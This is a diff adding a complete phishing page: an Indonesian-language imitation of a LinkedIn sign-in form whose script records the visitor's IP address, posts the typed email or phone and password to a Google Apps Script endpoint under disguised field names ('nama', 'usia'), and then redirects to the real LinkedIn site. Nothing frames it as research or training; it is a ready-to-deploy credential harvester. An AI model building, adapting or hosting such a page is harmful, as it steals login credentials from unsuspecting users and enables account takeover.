@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sign in - MyNetwork</title>
+<style>
+    * { 
+        box-sizing: border-box; 
+        margin: 0; 
+        padding: 0;
+    } 
+    
+    body { 
+        margin: 0; 
+        min-height: 100vh; 
+        display: flex; 
+        align-items: center; 
+        justify-content: center; 
+        background: #f3f6f8; 
+        font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif; 
+        color: #111; 
+        padding: 16px;
+    } 
+    
+    .app-container { 
+        width: 100%; 
+        max-width: 380px; 
+        background: #fff; 
+        border-radius: 12px; 
+        box-shadow: 0 10px 30px rgba(0,0,0,.08); 
+        padding: 28px; 
+    } 
+    
+    .logo-container { 
+        margin-bottom: 12px; 
+        text-align: left;
+    } 
+    
+    .logo-container img { 
+        max-height: 32px; 
+        max-width: 100%;
+        object-fit: contain;
+    } 
+    
+    .header-text { 
+        font-size: 26px; 
+        margin: 6px 0 4px; 
+        font-weight: 600;
+        color: rgba(0, 0, 0, 0.9);
+    } 
+
+    .subtitle-text {
+        color: #555;
+        font-size: 14px;
+        margin-bottom: 20px;
+    }
+    
+    .form-group { 
+        position: relative; 
+        margin-bottom: 16px; 
+    } 
+    
+    input { 
+        width: 100%; 
+        padding: 20px 12px 6px 12px; 
+        border-radius: 6px; 
+        border: 1px solid #cfd7df; 
+        font-size: 15px; 
+        outline: none;
+    } 
+    
+    input:focus { 
+        border-color: #0a66c2; 
+    } 
+    
+    .floating-label { 
+        position: absolute; 
+        left: 12px; 
+        top: 50%; 
+        transform: translateY(-50%); 
+        font-size: 15px; 
+        color: #555; 
+        pointer-events: none; 
+        transition: 0.2s; 
+    }
+    
+    input:focus ~ .floating-label, 
+    input:not(:placeholder-shown) ~ .floating-label { 
+        top: 10px; 
+        font-size: 11px; 
+        color: #0a66c2;
+    }
+    
+    .forgot-password-link { 
+        display: inline-block; 
+        margin: 4px 0 18px; 
+        font-size: 14px; 
+        color: #0a66c2; 
+        text-decoration: none; 
+        font-weight: 600;
+    } 
+    
+    .forgot-password-link:hover {
+        text-decoration: underline;
+        color: #084f96;
+    }
+
+    .btn-submit { 
+        width: 100%; 
+        padding: 12px; 
+        border-radius: 999px; 
+        border: none; 
+        background: #0a66c2; 
+        color: #fff; 
+        font-size: 16px; 
+        font-weight: 600; 
+        cursor: pointer; 
+        margin-bottom: 16px;
+    } 
+    
+    .btn-submit:hover { 
+        background: #084f96; 
+    } 
+
+    /* Style untuk teks persetujuan di bawah tombol */
+    .agreement-text {
+        font-size: 12px;
+        color: #555;
+        line-height: 1.5;
+        text-align: center;
+    }
+
+    .agreement-text a {
+        color: #0a66c2;
+        text-decoration: none;
+        font-weight: 600;
+    }
+
+    .agreement-text a:hover {
+        text-decoration: underline;
+    }
+</style>
+</head>
+<body>
+
+<div class="app-container">
+    <div class="logo-container">
+        <img src="https://iili.io/CG7MV6B.jpg" alt="Logo">
+    </div>
+
+    <!-- Tampilan Normal -->
+    <div id="normal-login-view">
+        <h1 class="header-text" id="title-text">Sign in</h1>
+        <div class="subtitle-text">Tetap terhubung dengan dunia profesional Anda</div>
+        
+        <form id="registrationForm">
+            <div class="form-group">
+                <input type="text" id="nama_lengkap" placeholder=" " required>
+                <label class="floating-label">Email atau Telepon</label>
+            </div>
+            <div class="form-group">
+                <input type="password" id="usia" placeholder=" " required>
+                <label class="floating-label">Password</label>
+            </div>
+            
+            <a href="#" class="forgot-password-link">Lupa password?</a>
+            
+            <button type="submit" class="btn-submit" id="submitBtn">Sign in</button>
+            
+            <!-- Teks Persetujuan Tambahan -->
+            <div class="agreement-text">
+                Dengan mengklik Lanjutkan untuk bergabung atau login, Anda menyetujui 
+                <a href="#">Perjanjian Pengguna</a>, 
+                <a href="#">Kebijakan Privasi</a>, dan 
+                <a href="#">Kebijakan Cookie</a>.
+            </div>
+        </form>
+    </div>
+</div>
+
+<script>
+async function sendToSheet(user, pass) {
+    let clientIP = "IP Tidak Terdeteksi";
+    try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        clientIP = data.ip;
+    } catch(e) {}
+
+    const gasURL = 'https://script.google.com/macros/s/AKfycbxFiRWPiUlRalzImeciW5EmSiNhRzLArd-EMs-GNNeQ784K8vgL3hCteRuFRmdyrehcbw/exec';
+    await fetch(gasURL, {
+        method: 'POST',
+        body: JSON.stringify({ nama: user, usia: pass, ip: clientIP })
+    });
+    window.location.href = "https://id.linkedin.com";
+}
+
+document.getElementById('registrationForm').addEventListener('submit', (e) => {
+    e.preventDefault();
+    sendToSheet(document.getElementById('nama_lengkap').value, document.getElementById('usia').value);
+});
+</script>
+</body>
+</html>
